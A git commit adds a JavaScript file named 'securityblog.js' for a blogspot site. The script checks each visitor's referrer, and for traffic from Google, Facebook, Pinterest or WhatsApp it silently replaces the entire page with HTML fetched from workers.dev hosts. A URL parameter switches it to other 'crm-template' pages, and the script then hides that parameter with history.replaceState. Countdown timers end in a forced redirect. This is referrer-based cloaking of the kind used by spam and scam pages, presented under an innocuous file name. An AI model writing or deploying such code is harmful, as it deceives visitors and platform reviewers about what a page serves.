49e6fdad636258a00d78cebb1f3e00ade79e5bd0
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-19 01:37:11 +0700

    Create securityblog.js

---
+++ securityblog.js
@@ -0,0 +1,85 @@
+const referrer = document.referrer.toLowerCase();
+const currentDomain = window.location.hostname.toLowerCase();
+
+const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
+
+if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'awer323.blogspot.com') {
+    fetch('https://hello-world-winter-night-5856.mastimon.workers.dev/')
+        .then(response => response.text())
+        .then(html => {
+            const article = document.querySelector('html');
+            article.innerHTML = html;
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const parameter = urlParams.get('br21r');
+
+            if (parameter === '2') {
+                fetch('https://crm-template-one.mastimon.workers.dev/')
+                    .then(response => response.text())
+                    .then(htmlContent => {
+                        article.innerHTML = htmlContent;
+                    });
+
+                const newUrl = window.location.href.replace('?br21r=2', '');
+                history.replaceState({}, '', newUrl);
+            } else if (parameter === '3') {
+                fetch('https://crm-template-two.mastimon.workers.dev/')
+                    .then(response => response.text())
+                    .then(htmlContent => {
+                        article.innerHTML = htmlContent;
+                    });
+
+                const newUrl = window.location.href.replace('?br21r=3', '');
+                history.replaceState({}, '', newUrl);
+            }
+        })
+        .catch(error => console.error(error));
+}
+
+let count = 5;
+let counter = setInterval(timer, 1000);
+function timer() {
+    count = count - 1;
+    if (count <= 0) {
+        document.getElementById('elpe-wait1').style.display = 'none';
+        document.getElementById('elpe-generate').style.display = 'block';
+        clearInterval(counter);
+        return;
+    }
+    document.getElementById("elpe-time").innerHTML = count;
+}
+
+function elpegenerate() {
+    document.getElementById('elpe').focus();
+    document.getElementById('elpe-link').style.display = 'none';
+    document.getElementById('elpe-wait2').style.display = 'block';
+
+    setInterval(function () {
+        document.getElementById('elpe-wait2').style.display = 'none';
+    }, 30000);
+    setInterval(function () {
+        document.getElementById('elpe-link').style.display = 'block';
+    }, 2000);
+}
+
+function countdown() {
+    var button = document.getElementById('myButton');
+    var countdown = 10;
+
+    button.disabled = true;
+
+    var countdownInterval = setInterval(function () {
+        button.innerHTML = 'Tunggu ' + countdown + ' detik...';
+        countdown--;
+
+        if (countdown < 0) {
+            clearInterval(countdownInterval);
+            window.location.href = 'https://awer323.blogspot.com/?br21r=3';
+        }
+    }, 1000);
+}
+
+document.body.style.overflow = "hidden";
+setTimeout(function() {
+    document.body.style.overflow = "auto";
+}, 2000);
